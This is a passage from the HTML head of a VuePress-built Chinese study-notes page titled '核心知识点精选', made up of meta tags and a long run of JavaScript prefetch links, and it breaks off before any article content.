<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>核心知识点精选 | 写作认知体系</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" href="/rat-summ/img/favicon.ico">
    <link rel="manifest" href="/rat-summ/manifest.json">
    <script charset="utf-8" src="/rat-summ/js/readmore.js"></script>
    <meta name="description" content="

  新的网页结构

  ...
  ...
  ...
  ...
  ...
  ...

`">
    <meta name="image" content="https://my.samyz.cn/_image/02.核心知识点精选/56f0b36edfaa4d8a862dd173c311dd24~tplv-k3u1fbpfcp-zoom-1.png">
    <meta name="twitter:title" content="核心知识点精选">
    <meta name="twitter:description" content="

  新的网页结构

  ...
  ...
  ...
  ...
  ...
  ...

`">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://my.samyz.cn/_image/02.核心知识点精选/56f0b36edfaa4d8a862dd173c311dd24~tplv-k3u1fbpfcp-zoom-1.png">
    <meta name="twitter:url" content="https://my.samyz.cn/%E3%80%8A%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7%E3%80%8B/100.%E6%8A%80%E8%83%BD%E6%8C%87%E5%8D%97/02.%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9%E7%B2%BE%E9%80%89.html">
    <meta property="og:type" content="article">
    <meta property="og:title" content="核心知识点精选">
    <meta property="og:description" content="

  新的网页结构

  ...
  ...
  ...
  ...
  ...
  ...

`">
    <meta property="og:image" content="https://my.samyz.cn/_image/02.核心知识点精选/56f0b36edfaa4d8a862dd173c311dd24~tplv-k3u1fbpfcp-zoom-1.png">
    <meta property="og:url" content="https://my.samyz.cn/%E3%80%8A%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7%E3%80%8B/100.%E6%8A%80%E8%83%BD%E6%8C%87%E5%8D%97/02.%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9%E7%B2%BE%E9%80%89.html">
    <meta property="og:site_name" content="samyzh">
    <meta property="article:published_time" content="2021-10-25T17:52:47.000Z">
    <meta itemprop="name" content="核心知识点精选">
    <meta itemprop="description" content="

  新的网页结构

  ...
  ...
  ...
  ...
  ...
  ...

`">
    <meta itemprop="image" content="https://my.samyz.cn/_image/02.核心知识点精选/56f0b36edfaa4d8a862dd173c311dd24~tplv-k3u1fbpfcp-zoom-1.png">
    <meta name="keywords" content="vuepress,theme,doc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/rat-summ/assets/css/0.styles.b7fb6ee3.css" as="style"><link rel="preload" href="/rat-summ/assets/js/app.12c8e251.js" as="script"><link rel="preload" href="/rat-summ/assets/js/3.9ee9750d.js" as="script"><link rel="preload" href="/rat-summ/assets/js/2.7c04700d.js" as="script"><link rel="preload" href="/rat-summ/assets/js/126.5b6d9993.js" as="script"><link rel="prefetch" href="/rat-summ/assets/js/10.80323458.js"><link rel="prefetch" href="/rat-summ/assets/js/100.63ac2838.js"><link rel="prefetch" href="/rat-summ/assets/js/101.f09c9fa8.js"><link rel="prefetch" href="/rat-summ/assets/js/102.e02db0d7.js"><link rel="prefetch" href="/rat-summ/assets/js/103.51677b36.js"><link rel="prefetch" href="/rat-summ/assets/js/104.61a1cf5b.js"><link rel="prefetch" href="/rat-summ/assets/js/105.70098b35.js"><link rel="prefetch" href="/rat-summ/assets/js/106.6ae75c51.js"><link rel="prefetch" href="/rat-summ/assets/js/107.d489a3d5.js"><link rel="prefetch" href="/rat-summ/assets/js/108.8e8c89ba.js"><link rel="prefetch" href="/rat-summ/assets/js/109.882f5f95.js"><link rel="prefetch" href="/rat-summ/assets/js/11.d181b5e4.js"><link rel="prefetch" href="/rat-summ/assets/js/110.9d564d94.js"><link rel="prefetch" href="/rat-summ/assets/js/111.478420b6.js"><link rel="prefetch" href="/rat-summ/assets/js/112.6c4c063d.js"><link rel="prefetch" href="/rat-summ/assets/js/113.3315b958.js"><link rel="prefetch" href="/rat-summ/assets/js/114.12c71440.js"><link rel="prefetch" href="/rat-summ/assets/js/115.ae4f07da.js"><link rel="prefetch" href="/rat-summ/assets/js/116.43f95817.js"><link rel="prefetch" href="/rat-summ/assets/js/117.ed8bfc6d.js"><link rel="prefetch" href="/rat-summ/assets/js/118.64e4c02c.js"><link rel="prefetch" href="/rat-summ/assets/js/119.b875aab9.js"><link rel="prefetch" href="/rat-summ/assets/js/12.0e10da37.js"><link rel="prefetch" href="/rat-summ/assets/js/120.bd5786bb.js"><link rel="prefetch" href="/rat-summ/assets/js/121.86519d2a.js"><link rel="prefetch" href="/rat-summ/assets/js/122.ceba69a1.js"><link rel="prefetch" href="/rat-summ/assets/js/123.daacf7b1.js"><link rel="prefetch" href="/rat-summ/assets/js/124.343ee32a.js"><link rel="prefetch" href="/rat-summ/assets/js/125.9bcd4dbe.js"><link rel="prefetch" href="/rat-summ/assets/js/127.83f78f6b.js"><link rel="prefetch" href="/rat-summ/assets/js/128.d24cd969.js"><link rel="prefetch" href="/rat-summ/assets/js/129.1f27d5da.js"><link rel="prefetch" href="/rat-summ/assets/js/13.464088c6.js"><link rel="prefetch" href="/rat-summ/assets/js/130.d8eb4273.js"><link rel="prefetch" href="/rat-summ/assets/js/131.8781abf8.js"><link rel="prefetch" href="/rat-summ/assets/js/132.6498f3c3.js"><link rel="prefetch" href="/rat-summ/assets/js/133.57a6dd2f.js"><link rel="prefetch" href="/rat-summ/assets/js/134.fad0beeb.js"><link rel="prefetch" href="/rat-summ/assets/js/135.77d5837d.js"><link rel="prefetch" href="/rat-summ/assets/js/136.f276fa7c.js"><link rel="prefetch" href="/rat-summ/assets/js/137.26c2d25c.js"><link rel="prefetch" href="/rat-summ/assets/js/138.7e4b3e8b.js"><link rel="prefetch" href="/rat-summ/assets/js/139.5b8ba084.js"><link rel="prefetch" href="/rat-summ/assets/js/14.8dbffc81.js"><link rel="prefetch" href="/rat-summ/assets/js/140.cebddf00.js"><link rel="prefetch" href="/rat-summ/assets/js/141.93995db1.js"><link rel="prefetch" href="/rat-summ/assets/js/142.ae5cbf85.js"><link rel="prefetch" href="/rat-summ/assets/js/143.dac237e2.js"><link rel="prefetch" href="/rat-summ/assets/js/144.fed101d1.js"><link rel="prefetch" href="/rat-summ/assets/js/145.df2f2e49.js"><link rel="prefetch" href="/rat-summ/assets/js/146.5feac5c1.js"><link rel="prefetch" href="/rat-summ/assets/js/147.0389a873.js"><link rel="prefetch" href="/rat-summ/assets/js/148.d3e8a026.js"><link rel="prefetch" href="/rat-summ/assets/js/149.7efffb81.js"><link rel="prefetch" href="/rat-summ/assets/js/15.8ec7b29e.js"><link rel="prefetch" href="/rat-summ/assets/js/150.fd38d672.js"><link rel="prefetch" href="/rat-summ/assets/js/151.afe3a15d.js"><link rel="prefetch" href="/rat-summ/assets/js/152.9412368d.js"><link rel="prefetch" href="/rat-summ/assets/js/153.7d3adbef.js"><link rel="prefetch" href="/rat-summ/assets/js/154.e3448ffd.js"><link rel="prefetch" href="/rat-summ/assets/js/155.0f81c9f4.js"><link rel="prefetch" href="/rat-summ/assets/js/156.c7bd68bf.js"><link rel="prefetch" href="/rat-summ/assets/js/157.d4cf6362.js"><link rel="prefetch" href="/rat-summ/assets/js/158.9d23effb.js"><link rel="prefetch" href="/rat-summ/assets/js/159.03c2fc1f.js"><link rel="prefetch" href="/rat-summ/assets/js/16.d97cc4b2.js"><link rel="prefetch" href="/rat-summ/assets/js/160.a3697128.js"><link rel="prefetch" href="/rat-summ/assets/js/161.ceef51ed.js"><link rel="prefetch" href="/rat-summ/assets/js/162.5a415671.js"><link rel="prefetch" href="/rat-summ/assets/js/163.cb7f48e0.js"><link rel="prefetch" href="/rat-summ/assets/js/164.22d1a032.js"><link rel="prefetch" href="/rat-summ/assets/js/165.d36b06fe.js"><link rel="prefetch" href="/rat-summ/assets/js/166.5562cf71.js"><link rel="prefetch" href="/rat-summ/assets/js/167.f2f53141.js"><link rel="prefetch" href="/rat-summ/assets/js/168.d1764292.js"><link rel="prefetch" href="/rat-summ/assets/js/169.71c1b376.js"><link rel="prefetch" href="/rat-summ/assets/js/17.974c76b3.js"><link rel="prefetch" href="/rat-summ/assets/js/170.a1844c75.js"><link rel="prefetch" href="/rat-summ/assets/js/171.8bd11d6b.js"><link rel="prefetch" href="/rat-summ/assets/js/172.630472f7.js"><link rel="prefetch" href="/rat-summ/assets/js/173.9f780f02.js"><link rel="prefetch" href="/rat-summ/assets/js/174.3903a474.js"><link rel="prefetch" href="/rat-summ/assets/js/175.0b55890f.js"><link rel="prefetch" href="/rat-summ/assets/js/176.ebd9da76.js"><link rel="prefetch" href="/rat-summ/assets/js/177.f866bfcc.js"><link rel="prefetch" href="/rat-summ/assets/js/178.9dab120a.js"><link rel="prefetch" href="/rat-summ/assets/js/179.00f175ae.js"><link rel="prefetch" href="/rat-summ/assets/js/18.f1a4f7b2.js"><link rel="prefetch" href="/rat-summ/assets/js/180.fd45856c.js"><link rel="prefetch" href="/rat-summ/assets/js/181.1f9f05a8.js"><link rel="prefetch" href="/rat-summ/assets/js/182.dec7bce8.js"><link rel="prefetch" href="/rat-summ/assets/js/183.ee99d36c.js"><link rel="prefetch" href="/rat-summ/assets/js/184.873055ff.js"><link rel="prefetch" href="/rat-summ/assets/js/185.836db06c.js"><link rel="prefetch" href="/rat-summ/assets/js/186.ed2b2aa0.js"><link rel="prefetch" href="/rat-summ/assets/js/187.f55e617d.js"><link rel="prefetch" href="/rat-summ/assets/js/188.ffd267f6.js"><link rel="prefetch" href="/rat-summ/assets/js/189.0777dab4.js"><link rel="prefetch" href="/rat-summ/assets/js/19.edc5370a.js"><link rel="prefetch" href="/rat-summ/assets/js/190.37c6eb5c.js"><link rel="prefetch" href="/rat-summ/assets/js/191.e2148011.js"><link rel="prefetch" href="/rat-summ/assets/js/192.74b5350b.js"><link rel="prefetch" href="/rat-summ/assets/js/193.92639440.js"><link rel="prefetch" href="/rat-summ/assets/js/194.07a698d3.js"><link rel="prefetch" href="/rat-summ/assets/js/195.d9d05ac9.js"><link rel="prefetch" href="/rat-summ/assets/js/196.893ea875.js"><link rel="prefetch" href="/rat-summ/assets/js/197.faf002df.js"><link rel="prefetch" href="/rat-summ/assets/js/198.e9af0cc8.js"><link rel="prefetch" href="/rat-summ/assets/js/199.78a32edd.js"><link rel="prefetch" href="/rat-summ/assets/js/20.33603afe.js"><link rel="prefetch" href="/rat-summ/assets/js/200.d1cec810.js"><link rel="prefetch" href="/rat-summ/assets/js/201.de6d878d.js"><link rel="prefetch" href="/rat-summ/assets/js/202.cdb07eb9.js"><link rel="prefetch" href="/rat-summ/assets/js/203.f82a15e9.js"><link rel="prefetch" href="/rat-summ/assets/js/204.f9c43a60.js"><link rel="prefetch" href="/rat-summ/assets/js/205.ebfd1b03.js"><link rel="prefetch" href="/rat-summ/assets/js/206.9322b908.js"><link rel="prefetch" href="/rat-summ/assets/js/207.b611c8e4.js"><link rel="prefetch" href="/rat-summ/assets/js/208.b56c09a4.js"><link rel="prefetch" href="/rat-summ/assets/js/209.5fa250ae.js"><link rel="prefetch" href="/rat-summ/assets/js/21.e361060e.js"><link rel="prefetch" href="/rat-summ/assets/js/210.afb67c23.js"><link rel="prefetch" href="/rat-summ/assets/js/211.975d8a93.js"><link rel="prefetch" href="/rat-summ/assets/js/212.e6114672.js"><link rel="prefetch" href="/rat-summ/assets/js/213.dcc0418e.js"><link rel="prefetch" href="/rat-summ/assets/js/214.b34c4a78.js"><link rel="prefetch" href="/rat-summ/assets/js/215.46240575.js"><link rel="prefetch" href="/rat-summ/assets/js/216.4fcc46c0.js"><link rel="prefetch" href="/rat-summ/assets/js/217.a2791aae.js"><link rel="prefetch" href="/rat-summ/assets/js/218.4c256ceb.js"><link rel="prefetch" href="/rat-summ/assets/js/219.a943095e.js"><link rel="prefetch" href="/rat-summ/assets/js/22.483a320b.js"><link rel="prefetch" href="/rat-summ/assets/js/220.9fc9ad7e.js"><link rel="prefetch" href="/rat-summ/assets/js/221.cbc0e78d.js"><link rel="prefetch" href="/rat-summ/assets/js/222.191f7e78.js"><link rel="prefetch" href="/rat-summ/assets/js/223.2f2104da.js"><link rel="prefetch" href="/rat-summ/assets/js/224.a96291e3.js"><link rel="prefetch" href="/rat-summ/assets/js/225.5e7d4a2f.js"><link rel="prefetch" href="/rat-summ/assets/js/226.f2c52aeb.js"><link rel="prefetch" href="/rat-summ/assets/js/227.29ce8f1e.js"><link rel="prefetch" href="/rat-summ/assets/js/228.606fc221.js"><link rel="prefetch" href="/rat-summ/assets/js/229.35c0193b.js"><link rel="prefetch" href="/rat-summ/assets/js/23.ea56380f.js"><link rel="prefetch" href="/rat-summ/assets/js/230.c18c39ff.js"><link rel="prefetch" href="/rat-summ/assets/js/231.8ac9de68.js"><link rel="prefetch" href="/rat-summ/assets/js/232.a37a54cf.js"><link rel="prefetch" href="/rat-summ/assets/js/233.2d63ab61.js"><link rel="prefetch" href="/rat-summ/assets/js/234.bb2f44c1.js"><link rel="prefetch" href="/rat-summ/assets/js/235.6b07773d.js"><link rel="prefetch" href="/rat-summ/assets/js/236.d9377791.js"><link rel="prefetch" href="/rat-summ/assets/js/237.9cae90d9.js"><link rel="prefetch" href="/rat-summ/assets/js/238.fc5c2f17.js"><link rel="prefetch" href="/rat-summ/assets/js/239.b69acdbe.js"><link rel="prefetch" href="/rat-summ/assets/js/24.8165c81c.js"><link rel="prefetch" href="/rat-summ/assets/js/240.2998122f.js"><link rel="prefetch" href="/rat-summ/assets/js/241.dfd9d735.js"><link rel="prefetch" href="/rat-summ/assets/js/242.6d57d6b1.js"><link rel="prefetch" href="/rat-summ/assets/js/243.39bb5753.js"><link rel="prefetch" href="/rat-summ/assets/js/244.37f91d9e.js"><link rel="prefetch" href="/rat-summ/assets/js/245.710a3e10.js"><link rel="prefetch" href="/rat-summ/assets/js/246.680ed8ab.js"><link rel="prefetch" href="/rat-summ/assets/js/247.7ea05ed5.js"><link rel="prefetch" href="/rat-summ/assets/js/248.e76a424e.js"><link rel="prefetch" href="/rat-summ/assets/js/249.7c88f5bc.js"><link rel="prefetch" href="/rat-summ/assets/js/25.def02ca5.js"><link rel="prefetch" href="/rat-summ/assets/js/250.4569c567.js"><link rel="prefetch" href="/rat-summ/assets/js/251.878e4926.js"><link rel="prefetch" href="/rat-summ/assets/js/252.67d9ba84.js"><link rel="prefetch" href="/rat-summ/assets/js/253.82ca1732.js"><link rel="prefetch" href="/rat-summ/assets/js/254.27dbadc2.js"><link rel="prefetch" href="/rat-summ/assets/js/255.60f68a5f.js"><link rel="prefetch" href="/rat-summ/assets/js/256.b47e4d3f.js"><link rel="prefetch" href="/rat-summ/assets/js/257.0df59c99.js"><link rel="prefetch" href="/rat-summ/assets/js/258.130b0487.js"><link rel="prefetch" href="/rat-summ/assets/js/259.97887542.js"><link rel="prefetch" href="/rat-summ/assets/js/26.97b1d951.js"><link rel="prefetch" href="/rat-summ/assets/js/260.6dac92fb.js"><link rel="prefetch" href="/rat-summ/assets/js/261.af516821.js"><link rel="prefetch" href="/rat-summ/assets/js/262.ef9f9b6a.js"><link rel="prefetch" href="/rat-summ/assets/js/263.dcc5eb79.js"><link rel="prefetch" href="/rat-summ/assets/js/264.61ce928d.js"><link rel="prefetch" href="/rat-summ/assets/js/265.82cb28d2.js"><link rel="prefetch" href="/rat-summ/assets/js/266.9eb89497.js"><link rel="prefetch" href="/rat-summ/assets/js/267.99284b0c.js"><link rel="prefetch" href="/rat-summ/assets/js/268.82dfc492.js"><link rel="prefetch" href="/rat-summ/assets/js/269.6cac85a2.js"><link rel="prefetch" href="/rat-summ/assets/js/27.c1905c39.js"><link rel="prefetch" href="/rat-summ/assets/js/270.69da763d.js"><link rel="prefetch" href="/rat-summ/assets/js/271.bbbb2115.js"><link rel="prefetch" href="/rat-summ/assets/js/272.ff0f601d.js"><link rel="prefetch" href="/rat-summ/assets/js/273.0f3d1f43.js"><link rel="prefetch" href="/rat-summ/assets/js/274.de951754.js"><link rel="prefetch" href="/rat-summ/assets/js/275.36fcef7b.js"><link rel="prefetch" href="/rat-summ/assets/js/276.0f69e2d6.js"><link rel="prefetch" href="/rat-summ/assets/js/277.6116c28b.js"><link rel="prefetch" href="/rat-summ/assets/js/278.3ec4a543.js"><link rel="prefetch" href="/rat-summ/assets/js/279.79cacba3.js"><link rel="prefetch" href="/rat-summ/assets/js/28.29769ec1.js"><link rel="prefetch" href="/rat-summ/assets/js/280.67eae4c9.js"><link rel="prefetch" href="/rat-summ/assets/js/281.6454a6a5.js"><link rel="prefetch" href="/rat-summ/assets/js/282.de2ce91b.js"><link rel="prefetch" href="/rat-summ/assets/js/283.82e0f4ca.js"><link rel="prefetch" href="/rat-summ/assets/js/284.69abfc0e.js"><link rel="prefetch" href="/rat-summ/assets/js/285.558435fb.js"><link rel="prefetch" href="/rat-summ/assets/js/286.fa4f4e4a.js"><link rel="prefetch" href="/rat-summ/assets/js/287.8f22a85e.js"><link rel="prefetch" href="/rat-summ/assets/js/288.d36804d8.js"><link rel="prefetch" href="/rat-summ/assets/js/289.992bf452.js"><link rel="prefetch" href="/rat-summ/assets/js/29.bc17da71.js"><link rel="prefetch" href="/rat-summ/assets/js/290.d217e3d5.js"><link rel="prefetch" href="/rat-summ/assets/js/291.0108ca07.js"><link rel="prefetch" href="/rat-summ/assets/js/292.c1cf5376.js"><link rel="prefetch" href="/rat-summ/assets/js/293.55852ed3.js"><link rel="prefetch" href="/rat-summ/assets/js/294.709d66f6.js"><link rel="prefetch" href="/rat-summ/assets/js/295.e8eb94ac.js"><link rel="prefetch" href="/rat-summ/assets/js/296.ffbcc931.js"><link rel="prefetch" href="/rat-summ/assets/js/297.7048aea4.js"><link rel="prefetch" href="/rat-summ/assets/js/298.9cd565b1.js"><link rel="prefetch" href="/rat-summ/assets/js/299.8e2896d9.js"><link rel="prefetch" href="/rat-summ/assets/js/30.e0901edb.js"><link rel="prefetch" href="/rat-summ/assets/js/300.1ba977f6.js"><link rel="prefetch" href="/rat-summ/assets/js/301.4bd8028d.js"><link rel="prefetch" href="/rat-summ/assets/js/302.7e3656f6.js"><link rel="prefetch" href="/rat-summ/assets/js/303.5fa30d30.js"><link rel="prefetch" href="/rat-summ/assets/js/304.0bb8668c.js"><link rel="prefetch" href="/rat-summ/assets/js/305.61286ea3.js"><link rel="prefetch" href="/rat-summ/assets/js/306.6e1b897f.js"><link rel="prefetch" href="/rat-summ/assets/js/307.f11f9af6.js"><link rel="prefetch" href="/rat-summ/assets/js/308.83cfb59e.js"><link rel="prefetch" href="/rat-summ/assets/js/309.88606eb8.js"><link rel="prefetch" href="/rat-summ/assets/js/31.727deefc.js"><link rel="prefetch" href="/rat-summ/assets/js/310.ca3c4062.js"><link rel="prefetch" href="/rat-summ/assets/js/311.9c98aab5.js"><link rel="prefetch" href="/rat-summ/assets/js/312.f5d5917b.js"><link rel="prefetch" href="/rat-summ/assets/js/313.6a0d74b5.js"><link rel="prefetch" href="/rat-summ/assets/js/314.351731a0.js"><link rel="prefetch" href="/rat-summ/assets/js/315.1bceaee4.js"><link rel="prefetch" href="/rat-summ/assets/js/316.91d9bb5c.js"><link rel="prefetch" href="/rat-summ/assets/js/317.43a7c8e3.js"><link rel="prefetch" href="/rat-summ/assets/js/318.f91f4e5e.js"><link rel="prefetch" href="/rat-summ/assets/js/319.03048efe.js"><link rel="prefetch" href="/rat-summ/assets/js/32.be33afa2.js"><link rel="prefetch" href="/rat-summ/assets/js/320.6c4d6375.js"><link rel="prefetch" href="/rat-summ/assets/js/321.c0f4c466.js"><link rel="prefetch" href="/rat-summ/assets/js/322.40427a9f.js"><link rel="prefetch" href="/rat-summ/assets/js/323.8ed5a81e.js"><link rel="prefetch" href="/rat-summ/assets/js/324.8af7bf04.js"><link rel="prefetch" href="/rat-summ/assets/js/325.eb380a4f.js"><link rel="prefetch" href="/rat-summ/assets/js/326.6b704e5c.js"><link rel="prefetch" href="/rat-summ/assets/js/327.ee41c7c2.js"><link rel="prefetch" href="/rat-summ/assets/js/328.c50090e6.js"><link rel="prefetch" href="/rat-summ/assets/js/329.b7234454.js"><link rel="prefetch" href="/rat-summ/assets/js/33.a5387702.js"><link rel="prefetch" href="/rat-summ/assets/js/330.0b389f14.js"><link rel="prefetch" href="/rat-summ/assets/js/331.ebc829ce.js"><link rel="prefetch" href="/rat-summ/assets/js/332.3dbd0d43.js"><link rel="prefetch" href="/rat-summ/assets/js/333.2ad93411.js"><link rel="prefetch" href="/rat-summ/assets/js/334.19c4fca0.js"><link rel="prefetch" href="/rat-summ/assets/js/335.618d7f92.js"><link rel="prefetch" href="/rat-summ/assets/js/336.06b12de2.js"><link rel="prefetch" href="/rat-summ/assets/js/337.dfb91030.js"><link rel="prefetch" href="/rat-summ/assets/js/338.fbf6c528.js"><link rel="prefetch" href="/rat-summ/assets/js/339.081585fe.js"><link rel="prefetch" href="/rat-summ/assets/js/34.2aa94fce.js"><link rel="prefetch" href="/rat-summ/assets/js/340.392a0549.js"><link rel="prefetch" href="/rat-summ/assets/js/341.571be598.js"><link rel="prefetch" href="/rat-summ/assets/js/342.0c20e7dc.js"><link rel="prefetch" href="/rat-summ/assets/js/343.f087f4bc.js"><link rel="prefetch" href="/rat-summ/assets/js/344.432ae94b.js"><link rel="prefetch" href="/rat-summ/assets/js/345.5d1f52c2.js"><link rel="prefetch" href="/rat-summ/assets/js/346.29082c3e.js"><link rel="prefetch" href="/rat-summ/assets/js/347.5431d43a.js"><link rel="prefetch" href="/rat-summ/assets/js/348.70a115c6.js"><link rel="prefetch" href="/rat-summ/assets/js/349.110d3aea.js"><link rel="prefetch" href="/rat-summ/assets/js/35.3926e73e.js"><link rel="prefetch" href="/rat-summ/assets/js/350.4dd299b8.js"><link rel="prefetch" href="/rat-summ/assets/js/351.aa1cf3a7.js"><link rel="prefetch" href="/rat-summ/assets/js/352.f2c9aff8.js"><link rel="prefetch" href="/rat-summ/assets/js/353.bb0da04a.js"><link rel="prefetch" href="/rat-summ/assets/js/354.7b1fde0d.js"><link rel="prefetch" href="/rat-summ/assets/js/355.7c67d056.js"><link rel="prefetch" href="/rat-summ/assets/js/356.a2f3c163.js"><link rel="prefetch" href="/rat-summ/assets/js/357.4aa2a57f.js"><link rel="prefetch" href="/rat-summ/assets/js/358.7abdc16b.js"><link rel="prefetch" href="/rat-summ/assets/js/359.0acb9993.js"><link rel="prefetch" href="/rat-summ/assets/js/36.e9252af1.js"><link rel="prefetch" href="/rat-summ/assets/js/360.077f565b.js"><link rel="prefetch" href="/rat-summ/assets/js/361.7d044219.js"><link rel="prefetch" href="/rat-summ/assets/js/362.6d5271d3.js"><link rel="prefetch" href="/rat-summ/assets/js/363.52b56886.js"><link rel="prefetch" href="/rat-summ/assets/js/364.6f2d9945.js"><link rel="prefetch" href="/rat-summ/assets/js/365.25fd0aec.js"><link rel="prefetch" href="/rat-summ/assets/js/366.8697c537.js"><link rel="prefetch" href="/rat-summ/assets/js/367.ade10048.js"><link rel="prefetch" href="/rat-summ/assets/js/368.58690662.js"><link rel="prefetch" href="/rat-summ/assets/js/369.e37f17bc.js"><link rel="prefetch" href="/rat-summ/assets/js/37.40c6e32d.js"><link rel="prefetch" href="/rat-summ/assets/js/370.81c0f5c2.js"><link rel="prefetch" href="/rat-summ/assets/js/371.781d9032.js"><link rel="prefetch" href="/rat-summ/assets/js/372.2f75884d.js"><link rel="prefetch" href="/rat-summ/assets/js/373.83a4e2c0.js"><link rel="prefetch" href="/rat-summ/assets/js/374.c1c69154.js"><link rel="prefetch" href="/rat-summ/assets/js/375.4df7a40c.js"><link rel="prefetch" href="/rat-summ/assets/js/376.0feeb93c.js"><link rel="prefetch" href="/rat-summ/assets/js/377.561ca7da.js"><link rel="prefetch" href="/rat-summ/assets/js/378.3da43834.js"><link rel="prefetch" href="/rat-summ/assets/js/379.75c285a8.js"><link rel="prefetch" href="/rat-summ/assets/js/38.e48735ea.js"><link rel="prefetch" href="/rat-summ/assets/js/380.f94bd4a3.js"><link rel="prefetch" href="/rat-summ/assets/js/381.71953594.js"><link rel="prefetch" href="/rat-summ/assets/js/382.944a71d7.js"><link rel="prefetch" href="/rat-summ/assets/js/383.c6a18246.js"><link rel="prefetch" href="/rat-summ/assets/js/384.e089b47b.js"><link rel="prefetch" href="/rat-summ/assets/js/385.91742919.js"><link rel="prefetch" href="/rat-summ/assets/js/386.48e3b2e2.js"><link rel="prefetch" href="/rat-summ/assets/js/387.e29cd861.js"><link rel="prefetch" href="/rat-summ/assets/js/388.f70a74b4.js"><link rel="prefetch" href="/rat-summ/assets/js/389.104fdecf.js"><link rel="prefetch" href="/rat-summ/assets/js/39.825dffc2.js"><link rel="prefetch" href="/rat-summ/assets/js/390.6275cef1.js"><link rel="prefetch" href="/rat-summ/assets/js/391.8bb66679.js"><link rel="prefetch" href="/rat-summ/assets/js/392.3fe296d9.js"><link rel="prefetch" href="/rat-summ/assets/js/393.a4dc5585.js"><link rel="prefetch" href="/rat-summ/assets/js/394.d659930b.js"><link rel="prefetch" href="/rat-summ/assets/js/395.d2262aea.js"><link rel="prefetch" href="/rat-summ/assets/js/396.25b1e0de.js"><link rel="prefetch" href="/rat-summ/assets/js/397.41c6d90f.js"><link rel="prefetch" href="/rat-summ/assets/js/398.1023659d.js"><link rel="prefetch" href="/rat-summ/assets/js/399.6645efbd.js"><link rel="prefetch" href="/rat-summ/assets/js/4.5b220e8a.js"><link rel="prefetch" href="/rat-summ/assets/js/40.1f51dbcf.js"><link rel="prefetch" href="/rat-summ/assets/js/400.a979839c.js"><link rel="prefetch" href="/rat-summ/assets/js/401.3f1af38a.js"><link rel="prefetch" href="/rat-summ/assets/js/402.17ee8256.js"><link rel="prefetch" href="/rat-summ/assets/js/403.e5dd7606.js"><link rel="prefetch" href="/rat-summ/assets/js/404.b57e2cc6.js"><link rel="prefetch" href="/rat-summ/assets/js/405.2042fa73.js"><link rel="prefetch" href="/rat-summ/assets/js/406.e64bdb23.js"><link rel="prefetch" href="/rat-summ/assets/js/407.9a276c18.js"><link rel="prefetch" href="/rat-summ/assets/js/408.a528edd8.js"><link rel="prefetch" href="/rat-summ/assets/js/409.dba4cf75.js"><link rel="prefetch" href="/rat-summ/assets/js/41.58f3de48.js"><link rel="prefetch" href="/rat-summ/assets/js/410.d0b106c6.js"><link rel="prefetch" href="/rat-summ/assets/js/411.4b9dd0be.js"><link rel="prefetch" href="/rat-summ/assets/js/412.d2b4534c.js"><link rel="prefetch" href="/rat-summ/assets/js/413.13933934.js"><link rel="prefetch" href="/rat-summ/assets/js/414.f3aa79b3.js"><link rel="prefetch" href="/rat-summ/assets/js/415.7fb4f462.js"><link rel="prefetch" href="/rat-summ/assets/js/416.529de55d.js"><link rel="prefetch" href="/rat-summ/assets/js/417.4ca243c1.js"><link rel="prefetch" href="/rat-summ/assets/js/418.3c7e6391.js"><link rel="prefetch" href="/rat-summ/assets/js/419.821db849.js"><link rel="prefetch" href="/rat-summ/assets/js/42.1f57183a.js"><link rel="prefetch" href="/rat-summ/assets/js/420.4153e14c.js"><link rel="prefetch" href="/rat-summ/assets/js/421.94820f33.js"><link rel="prefetch" href="/rat-summ/assets/js/422.b85144cb.js"><link rel="prefetch" href="/rat-summ/assets/js/423.5702fec2.js"><link rel="prefetch" href="/rat-summ/assets/js/424.f3bb53f3.js"><link rel="prefetch" href="/rat-summ/assets/js/425.a09dac6c.js"><link rel="prefetch" href="/rat-summ/assets/js/426.5e7ea56d.js"><link rel="prefetch" href="/rat-summ/assets/js/427.dfe1e1f5.js"><link rel="prefetch" href="/rat-summ/assets/js/428.8829fe2e.js"><link rel="prefetch" href="/rat-summ/assets/js/429.206cbd26.js"><link rel="prefetch" href="/rat-summ/assets/js/43.f4ef7e7a.js"><link rel="prefetch" href="/rat-summ/assets/js/430.2e934b92.js"><link rel="prefetch" href="/rat-summ/assets/js/431.93b96b64.js"><link rel="prefetch" href="/rat-summ/assets/js/432.5742508e.js"><link rel="prefetch" href="/rat-summ/assets/js/433.602400bb.js"><link rel="prefetch" href="/rat-summ/assets/js/434.3c068b74.js"><link rel="prefetch" href="/rat-summ/assets/js/435.bd23ba01.js"><link rel="prefetch" href="/rat-summ/assets/js/436.f276df3f.js"><link rel="prefetch" href="/rat-summ/assets/js/437.e3136874.js"><link rel="prefetch" href="/rat-summ/assets/js/438.365bddbf.js"><link rel="prefetch" href="/rat-summ/assets/js/439.8610d147.js"><link rel="prefetch" href="/rat-summ/assets/js/44.95428610.js"><link rel="prefetch" href="/rat-summ/assets/js/440.d470a96c.js"><link rel="prefetch" href="/rat-summ/assets/js/441.51e68998.js"><link rel="prefetch" href="/rat-summ/assets/js/442.21942f8f.js"><link rel="prefetch" href="/rat-summ/assets/js/443.d78b7124.js"><link rel="prefetch" href="/rat-summ/assets/js/444.7ab2a2ce.js"><link rel="prefetch" href="/rat-summ/assets/js/445.734e537c.js"><link rel="prefetch" href="/rat-summ/assets/js/446.b6a46bba.js"><link rel="prefetch" href="/rat-summ/assets/js/447.0e610df1.js"><link rel="prefetch" href="/rat-summ/assets/js/448.c431addf.js"><link rel="prefetch" href="/rat-summ/assets/js/449.fd3f57c4.js"><link rel="prefetch" href="/rat-summ/assets/js/45.2f49bb0c.js"><link rel="prefetch" href="/rat-summ/assets/js/450.488cf3df.js"><link rel="prefetch" href="/rat-summ/assets/js/451.1812acf0.js"><link rel="prefetch" href="/rat-summ/assets/js/452.b9e98643.js"><link rel="prefetch" href="/rat-summ/assets/js/453.3a90612b.js"><link rel="prefetch" href="/rat-summ/assets/js/454.5aaa7797.js"><link rel="prefetch" href="/rat-summ/assets/js/455.0f8b8d13.js"><link rel="prefetch" 